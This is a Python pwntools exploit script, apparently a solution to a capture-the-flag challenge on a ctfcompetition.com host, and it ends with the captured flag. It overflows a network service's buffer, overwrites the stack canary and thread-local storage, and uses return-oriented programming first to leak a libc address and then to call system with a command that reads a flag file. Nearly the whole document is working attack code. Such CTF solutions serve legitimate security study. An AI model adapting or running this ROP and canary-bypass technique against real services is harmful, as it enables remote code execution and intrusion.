#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

# leak
r = remote("mlwr-part1.ctfcompetition.com", 4242)
r.send(flat(
    p32(8),     # payload length
    0,          # key
    "A" * 1320, 
    0,          # canary
    "A" * 24,
    0x40a101,   # 0x40a101 : pop rax ; pop rcx ; pop rdx ; pop rsi ; pop rdi ; call rax
    0x400A81,   # rax = send
    0x0,        # rcx = flag
    20,         # rdx = len
    0x60BFE8,   # rsi = buf
    4,          # rdi = fd
    "\x00" * 0x200 # overwrite tls
))
r.shutdown()

try:
    libc_base = u64(r.recv(8)) - 0x20630
    libc_system = libc_base + 0x41100
    log.info("libc_base = " + hex(libc_base))
    log.info("libc_system = " + hex(libc_system))
    r.close()
except EOFError:
    log.error("Leak failed...")

# pwn
r = remote("mlwr-part1.ctfcompetition.com", 4242)

buf = 0x60C200
pop_rdi = 0x40aeb3
pop_rax = 0x408108
pop_rbp = 0x400b18

def write(addr, data):
    data += "\x00" * (8 - len(data) % 8)
    payload = ""
    for i in range(0, len(data), 8):
        payload += flat(
            pop_rbp, buf+0x10 + i,
            pop_rax, data[i:i+8],
            0x4093e1, 0   # mov qword ptr [rbp-0x10], rax ... pop rbp
        )
    return payload

r.send(flat(
    p32(8),     # payload length
    0,          # key
    "A" * 1320, 
    0,          # canary
    "A" * 24,

    write(buf, "cat /home/ntpdate/flag2.txt >&4"),

    # system(buf)
    pop_rdi, buf, libc_system,

    "\x00" * 0x200 # overwrite tls
))
r.shutdown()
try:
    log.success(r.recvline())
except EOFError:
    log.error("Exploit Failed...")

# CTF{~~~APT warz: teh 3mpire pwns b4ck~~~}

